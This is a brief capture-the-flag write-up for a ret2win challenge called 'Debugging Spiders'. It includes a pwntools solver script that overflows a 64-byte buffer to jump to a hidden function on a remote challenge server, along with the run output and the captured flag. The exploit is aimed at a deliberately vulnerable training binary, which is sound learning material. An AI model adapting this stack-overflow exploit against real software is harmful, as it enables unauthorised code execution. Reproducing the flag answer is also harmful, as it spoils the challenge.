# Debugging Spiders
<br>
<br>

In this Challenge our objective is to jump to a function called `secret_spider`, the binary itself print an address where we are jumping to after we give the binary some input, it's a classic Ret2win challenge, with the gdb I was able to find the offset which is 64 and then the address of the `secret_spider`, and make an exploit base on what I found. Sadly when I tried to test it against the server, I don't see the flag anywhere, I tried to change my `p.interactive()` to `p.recvall()` since I thought the cause is that not all stdout is being printed with interarctive and I finally get the flag.

**solver.py**
```python
from pwn import *

binary = './spiders'
elf = context.binary = ELF(binary, checksec=True)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if 'remote' in sys.argv:
    p = remote('34.124.192.13', 27302)
else:
    p = process(binary)
    if 'gdb' in sys.argv:
        gdb.attach(p, gdbscript=gdbscript)

payload = b'a'*64
payload+= p32(0x080491a6)

p.sendline(payload)

print(p.recvall())
```

```bash
$ python3 solve.py remote
[*] '/home/kiinzu/Documents/FCTF/spiders'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 34.124.192.13 on port 27302: Done
[+] Receiving all data: Done (123B)
[*] Closed connection to 34.124.192.13 port 27302
b'FindITCTF{Ju57_7h3_W4y_1t_iz}\ncalling function pointer, jumping to 0x080491a6\nWhy the silly face when the room so serious?\n'
```